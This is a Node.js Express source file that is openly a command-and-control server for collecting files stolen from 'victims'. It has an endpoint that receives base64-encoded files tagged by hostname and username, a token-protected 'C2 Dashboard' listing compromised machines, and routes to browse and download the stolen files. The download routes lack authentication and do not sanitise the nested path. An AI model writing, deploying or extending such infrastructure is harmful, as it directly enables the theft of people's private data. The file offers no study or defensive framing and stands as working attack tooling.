const express = require("express");
const fs = require("fs").promises;
const path = require("path");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));

// --- Determine folder path ---
const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "victims")
  : path.join(__dirname, "victims");

const SECRET_TOKEN = process.env.SECRET_TOKEN || "local_dev_token";

(async () => {
  try {
    await fs.mkdir(VICTIMS_DIR, { recursive: true });
    console.log(`Victims folder ready at ${VICTIMS_DIR}`);
  } catch (err) {
    process.exit(1);
  }
})();

// --- Dashboard ---
app.get("/", async (req, res) => {
  if (req.headers.authorization !== `Bearer ${SECRET_TOKEN}`)
    return res.status(403).send("Unauthorized");

  try {
    const victims = await fs.readdir(VICTIMS_DIR);
    res.send(`<h2>C2 Dashboard — ${victims.length} victims</h2>
      <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>`);
  } catch (err) { res.status(500).send("Read error"); }
});

// --- Receive file ---
app.post("/send", async (req, res) => {
  const { hostname, username, file, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Unauthorized" });
  if (!file) return res.status(400).json({ error: "No file" });

  const safeFolder = path.basename(`${hostname}_${username}`);
  const safeFileName = file.name.replace(/\.\./g, "").replace(/[<>:"|?*]/g, "_");
  const filePath = path.join(VICTIMS_DIR, safeFolder, safeFileName);

  try {
    await fs.mkdir(path.dirname(filePath), { recursive: true });
    await fs.writeFile(filePath, Buffer.from(file.content, "base64"));
    console.log(`[+] ${safeFolder} — saved ${safeFileName}`);
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: "Write failed" }); }
});

// --- Browse victim ---
app.get("/victim/:id", async (req, res) => {
  const safeId = path.basename(req.params.id);
  const victimDir = path.join(VICTIMS_DIR, safeId);
  try {
    const files = await fs.readdir(victimDir);
    res.send(`<h2>Victim: ${safeId}</h2>
      <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f}">${f}</a></li>`).join("")}</ul>`);
  } catch (e) { res.status(404).send("Not found"); }
});

app.get("/victim/:id/:path(.*)", async (req, res) => {
  const safeId = path.basename(req.params.id);
  const nestedPath = req.params.path; // This will now contain "Documents/file.pdf"
  
  const filePath = path.join(VICTIMS_DIR, safeId, nestedPath);

  res.download(filePath, err => {
    if (err && !res.headersSent) {
      console.error("Download failed:", err);
      res.status(404).send("File not found");
    }
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 running on port ${PORT}`));